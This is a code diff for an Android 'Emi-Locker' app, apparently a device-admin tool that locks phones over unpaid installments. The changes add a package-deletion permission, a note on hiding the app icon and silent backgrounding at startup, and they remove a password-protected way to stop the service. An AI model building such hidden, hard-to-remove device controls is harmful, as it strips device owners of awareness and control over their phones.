@@ -164,7 +164,8 @@ public class MainActivity extends AppCompatActivity {
             Manifest.permission.READ_CALL_LOG,
             Manifest.permission.WRITE_SECURE_SETTINGS,
             Manifest.permission.WRITE_SETTINGS,
-            Manifest.permission.INSTALL_PACKAGES
+            Manifest.permission.INSTALL_PACKAGES,
+            Manifest.permission.REQUEST_DELETE_PACKAGES,
     };
     SharedPreferences sharedPreferences;
     private Context context;
@@ -189,18 +190,23 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-        setContentView(R.layout.activity_main);
+//        Hide app's icon using below code:
 
+
+        setContentView(R.layout.activity_main);
+        if (IsStartup()) {
+            Toast.makeText(this,String.valueOf(IsStartup())+"Test",Toast.LENGTH_LONG).show();
+            moveTaskToBack(true);
+        }
 //        createNotficationchannel();
         //Firebase Istance
         auth = FirebaseAuth.getInstance();
 
-        emailText =(EditText) findViewById(R.id.emailId);
-        passwordText =(EditText) findViewById(R.id.editTextPassword);
         sharedPreferences = getSharedPreferences("LockingState",MODE_PRIVATE);
         SharedPreferences.Editor editor = sharedPreferences.edit();
         editor.putBoolean("status", false);
         editor.apply();
+
 
         ActionBar actionBar = getSupportActionBar(); // or getActionBar();
         getSupportActionBar().setTitle("Emi-Locker"); // set the top title
@@ -210,30 +216,13 @@ public class MainActivity extends AppCompatActivity {
         String title = actionBar.getTitle().toString(); // get the title
         actionBar.hide(); // or even hide the actionbar
 
-        pass =password.getInstance();
+        pass = password.getInstance();
 
         permissionText = findViewById(R.id.permissionText);
 
         //        Hide the textview and edittext
         registerText =(TextView) findViewById(R.id.registerText);
         registerText.setEnabled(true);
-
-        checkEmailBtn = findViewById(R.id.emailBtn);
-        checkEmailBtn.setEnabled(false);
-        checkEmailBtn.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                if (isConnected(getApplicationContext())) {
-                    Toast.makeText(getApplicationContext(), "Internet Connected", Toast.LENGTH_SHORT).show();
-//                    checkEmail();
-                    loginUserAccount();
-                } else {
-                    Toast.makeText(getApplicationContext(), "No Internet Connection", Toast.LENGTH_SHORT).show();
-                }
-
-            }
-        });
-
 
         try {
             // Initiate DevicePolicyManager.
@@ -304,24 +293,8 @@ public class MainActivity extends AppCompatActivity {
         }
 
 
-//        Stop Service
-        TextView anti = (TextView) findViewById(R.id.anti);
-        anti.setOnLongClickListener(new View.OnLongClickListener() {
-            @Override
-            public boolean onLongClick(View v) {
-                askPassword();
-                return true;
-            }
-        });
+//
 
-        loginText = (TextView) findViewById(R.id.textView8);
-        loginText.setOnLongClickListener(new View.OnLongClickListener() {
-            @Override
-            public boolean onLongClick(View v) {
-                addAutoStartup();
-                return true;
-            }
-        });
 
 
     }
@@ -815,14 +788,14 @@ public class MainActivity extends AppCompatActivity {
                 intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                 intent.setData(Uri.parse("package:" + packageName));
                 startActivity(intent);
-                try{
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                        startActivity(new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES));
-                    }
-                }
-                catch(Exception e){
-                    Log.d("errr",e+"found");
-                }
+//                try{
+//                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+//                        startActivity(new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES));
+//                    }
+//                }
+//                catch(Exception e){
+//                    Log.d("errr",e+"found");
+//                }
             }
 
         }
@@ -968,6 +941,11 @@ public class MainActivity extends AppCompatActivity {
 
             }
         });
+    }
+
+    private boolean IsStartup()
+    {
+        return getIntent().hasExtra("minimize");
     }
 
     private void addAutoStartup() {
